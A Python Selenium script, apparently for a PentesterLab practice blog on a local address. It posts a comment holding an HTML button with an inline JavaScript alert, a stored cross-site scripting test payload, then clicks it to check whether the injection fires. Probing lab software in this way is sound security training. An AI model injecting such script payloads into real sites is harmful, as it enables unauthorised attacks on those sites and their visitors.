from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import requests
import time
import platform
from lxml import etree  # 解析页面

class blog_spider:
    chrome_driver_path = ""
    driver = None
    main_page_url = 'http://192.168.56.11'
    main_page_title = 'PentesterLab vulnerable blog'

    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
                        'Chrome/51.0.2704.63 Safari/537.36'}

    cookies = None
    request_session = None

    def __init__(self):

        if platform.system()=='Windows':
            self.chrome_driver_path = "chromedriver.exe"
        elif platform.system()=='Linux' or platform.system()=='Darwin':
            self.chrome_driver_path = "./chromedriver"
        else:
            print('Unknown System Type. quit...')
            return None

        requests.headers = self.headers

        try:
            r = requests.get(self.main_page_url)
        except requests.exceptions.RequestException as e:
            print('链接异常，请检查网络')
            print(e)
            quit()

        if(r.status_code!=200):
            print('http状态码错误')
            quit()

        chrome_options = Options()
        # chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')    # 禁用gpu加速
        self.driver = webdriver.Chrome(chrome_options=chrome_options, \
            executable_path= self.chrome_driver_path)

        return None

    def submit_comment(self):
        self.driver.get(self.main_page_url)
        time.sleep(1)
        if self.driver.title!=self.main_page_title :
            print('不是期望的主页Title，网页改版了？')
            return False

        self.driver.find_element_by_xpath('/html/body/div[2]/div/div[1]/div/div/p[1]/a').click()
        time.sleep(1)

        la_html = etree.HTML(self.driver.page_source)
        la_comment_cnt = len(la_html.xpath('/html/body/div[2]/div/div[1]/div/div/div[2]/ul/li'))

        elem_text = self.driver.find_element_by_name("text")

        elem_text.send_keys('''<input type="button" onclick="alert('Hi~! You have seen a leak.');" value="Press me!" />''')
        time.sleep(1)
        self.driver.find_element_by_xpath('/html/body/div[2]/div/div[1]/div/form/input[3]').click()
        time.sleep(2)

        new_html = etree.HTML(self.driver.page_source)
        new_comment_cnt = len(new_html.xpath('/html/body/div[2]/div/div[1]/div/div/div[2]/ul/li'))
        time.sleep(2)

        if(la_comment_cnt == new_comment_cnt):
            return False
        else:
            return True

    def getAlert(self):
        self.driver.find_element_by_xpath('/html/body/div[2]/div/div[1]/div/div/div[2]/ul/li[last()]/input').click()
        time.sleep(2)

        if(self.driver.switch_to_alert()):
            self.driver.switch_to_alert().accept()
            return True
        else:
            return False

if __name__ == "__main__":
    bsp = blog_spider()
    if(bsp.submit_comment()):
        res = bsp.getAlert()
        if(res == True):
            print("There is a leak.")
        else:
            print("Maybe there isn't a leak.")